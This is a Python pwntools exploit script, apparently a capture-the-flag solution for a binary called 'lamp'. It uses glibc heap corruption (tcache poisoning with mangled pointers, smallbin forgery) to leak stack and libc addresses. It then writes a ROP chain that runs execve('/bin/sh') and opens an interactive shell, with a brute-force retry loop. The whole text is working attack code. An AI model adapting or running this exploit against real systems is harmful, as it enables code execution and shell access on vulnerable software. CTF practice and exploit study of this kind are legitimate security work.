#!/usr/bin/env python3

from pwn import *
from tqdm import tqdm

exe = ELF("./lamp")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

serv = "localhost"
port = 5000

context.binary = exe
context.aslr = False

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process(["./run"])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                base
                #b *0x7ffff7cabe87
            """)
    return r

r = None
    
def mangle(ptr, pos):
    return (pos >> 12) ^ ptr

def flush():
    global cnt
    r.recvuntil(b">"*cnt)
    cnt = 0

def add(sz, data=b"A"):
    global cnt
    r.send(str(hex(sz)[2:]).encode())
    r.sendline(data)
    cnt += 1

def free(sz):
    sz += 0x20
    if sz > 0x100:
        log.error("unsupported free size")
        exit(1)
    rem = (0x100-sz)//0x10
    for i in range(13):
        if rem > 0:
            add(0xff)
            rem -= 1
        else:
            add(0xf8)
    add(0xf8, b"A"*0xf8 + p64(sz|1))
    add(0xf8)

def shoot():
    global r, cnt, heap
    cnt = 1
    heap = u64(r.recv(8))<<12
    log.info(f"{hex(heap)=}")
    # set up predictable top chunk for free primtive
    for _ in range(11):
        add(0xff)
    add(0xff, b"A"*0x108 + p64(0x91))
    add(0xf8)
    # partial overwrite smallbin arena pointers to forge
    # entry with stack address, will be put
    # into tcache after tcache stashing
    sz = 0xa0
    for _ in range(11):
        free(sz)
    free(0x20)
    free(sz)
    for _ in range(7):
        free(sz+0x10)
    free(0x20)
    free(sz+0x10)
    free(sz+0x10)
    #off = 0xf6e0
    off = 0x46e0
    add(0x18, b"A"*0x21f68+p64(sz+0x10|1)+p64(heap+0x1b9f40)+p16(off-0x18))
    add(0x18, b"A"*0x21f78+p64(sz|1)+p64(heap+0x175f40)+p64(heap+0x2ebf30))
    for _ in range(7):
        add(sz-8)
    add(sz-8)
    # partial overwrite stack address in TPS with zeros
    # so it's definitely below return address of read
    sz += 0x20
    free(sz)
    free(0x20)
    free(sz)
    add(0x18, b"A"*0x21f58+p64(sz|1)+p64(mangle(heap+0xc0, heap+0x373f20)))
    add(sz-8)
    partial = 0
    add(sz-8, p64(0)*2+p16(partial))
    # set up 0x20 to have stack fd for leaking later
    add(0x18)
    free(0x20)
    free(0x30)
    free(0x20)
    add(0x28, b"A"*0x22008+p64(0x21)+p64(mangle(heap+0xd0, heap+0x3d9fc0)))
    add(0x18)
    add(0x18, b"\x00")
    for _ in range(8):
        free(0x90)
    # gradually send bytes into stack,
    # will loop main once we overwrite low byte of
    # read's return, keep track of number of bytes sent for leak
    flush()
    leak = b""
    r.send(b"98")
    r.send(p8(0xa0)*8)
    diff = 8 + partial
    for _ in tqdm(range(0x10000//16)):
        r.send(p8(0xa0))
        leak = r.recvuntil(b">", timeout=0.05)
        if leak != b"":
            break
        r.send(p8(0xa0)*15)
        diff += 0x10
    stack = (u64(leak[:8])&(~0xffff))+diff-0x150
    log.info(f"{hex(stack)=}")
    # leak libc with tcache poisoning on stack to loop main
    free(0x40)
    free(0x20)
    add(0x38, p64(0x431)*(0x22018//8)+p64(0x21)+p64(mangle(heap+0x52bfc0, heap+0x52dfc0)))
    add(0x18)
    free(0x30)
    free(0x40)
    free(0x30)
    add(0x38, b"A"*0x22008+p64(0x31)+p64(mangle(stack-0x18, heap+0x593fb0)))
    add(0x28)
    flush()
    add(0x28, p64(0)*3+p8(0xa0))
    stack -= 0x150
    libc.address = u64(r.recv(8))-0x203b20
    log.info(f"{hex(libc.address)=}")
    # set up rop chain, requires sending
    # payload into the strtol input buffer.
    # will return 0 when conversion is bad so we poison 0x20
    add(0xff)
    add(0xff)
    add(0xff)
    add(0xff)
    add(0xf8)
    free(0x30)
    free(0x40)
    free(0x30)
    add(0x38, b"A"*0x22008 + p64(0x31) + p64(mangle(stack+8, heap+0x5f9fb0)))
    add(0x28)
    poprdi = libc.address+0x10f75b
    poprsi = libc.address+0x2b46b
    poprax = libc.address+0xdd237
    xorrdx = libc.address+0xa0d6f
    rop = p64(poprdi)+p64(next(libc.search(b"/bin/sh\x00")))
    rop += p64(poprsi)+p64(0)*2+p64(poprax)+p64(0x3b)+p64(xorrdx)
    add(0x28, rop)
    free(0x20)
    free(0x30)
    free(0x20)
    add(0x28, b"A"*0x22008+p64(0x21)+p64(mangle(stack-0x18, heap+0x65ffc0)))
    add(0x18)
    r.send(p16((poprdi>>40)&0xffff))
    r.sendline(p64(0)*3+p8(0xf8))
    r.interactive()

def main():
    global r
    done = False
    # 4 bit bruteforce
    for i in range(0x20):
        r = conn()
        log.info(f"attempt {i}")
        try:
            shoot()
            done = True
        except:
            r.close()
            pass
        if done:
            break

if __name__ == "__main__":
    main()
